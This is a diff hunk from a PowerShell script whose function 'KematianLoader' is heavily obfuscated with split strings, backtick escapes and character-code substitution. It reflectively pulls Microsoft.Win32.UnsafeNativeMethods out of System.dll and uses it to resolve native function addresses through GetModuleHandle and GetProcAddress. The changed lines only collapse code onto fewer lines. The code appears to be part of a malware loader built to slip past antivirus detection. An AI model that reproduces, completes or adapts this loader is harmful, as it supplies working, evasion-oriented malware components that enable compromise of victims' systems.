@@ -4,15 +4,9 @@ function KematianLoader {
     $assem = ([AppDomain]::"cU`R`Re`NTdOMaIn".(('GE'+'T')+('as'+'S')+('EmBLIe'+'S')).Invoke() | ? { $_."GlO`BaLasS`eMBLY`C`AchE" -and $_."lo`Ca`TIoN".('sp'+('L'+'It')).Invoke((('qw'+'IqwI').rEplAcE(([chAr]113+[chAr]119+[chAr]73),[sTriNG][chAr]92)))[-1].('Eq'+('u'+'al')+'S').Invoke(('Syst'+'e'+'m.dll')) }).(('g'+'ET')+'Ty'+'Pe').Invoke(('M'+'icrosoft.Win3'+'2.Uns'+'afeNa'+'tive'+'Metho'+'ds'))
     $tmp = $assem.('gE'+'t'+('METh'+'ODS')).Invoke() | Where-Object { $_."NA`Me" -eq ('Get'+'P'+'rocAddre'+'ss') }
     $handleMethod = $assem.(('getm'+'e')+('tho'+'d')).Invoke(('Ge'+'tModuleHa'+'nd'+'le'))
-    $handle = $handleMethod."In`V`OKE"($null, @($kematian_modules))
-    [IntPtr] $result = 0
-    if ($handle -ne $null) {
-        $result = $tmp[0]."i`Nv`oKe"($null, @($handle, $kematian_func))
-    }
-    if ($result -eq [IntPtr]::"ZE`RO") {
-        $handleRef = [System.Runtime.InteropServices.HandleRef]::('N'+'Ew').Invoke($null, $handle)
-        $result = $tmp[0]."In`V`okE"($null, @($handleRef, $kematian_func))
-    }
+    $handle = $handleMethod."In`V`OKE"($null, @($kematian_modules));[IntPtr] $result = 0
+    if ($handle -ne $null) { $result = $tmp[0]."i`Nv`oKe"($null, @($handle, $kematian_func))}
+    if ($result -eq [IntPtr]::"ZE`RO") {$handleRef = [System.Runtime.InteropServices.HandleRef]::('N'+'Ew').Invoke($null, $handle);$result = $tmp[0]."In`V`okE"($null, @($handleRef, $kematian_func))}
     return $result
 }
 function kematian_delegates {
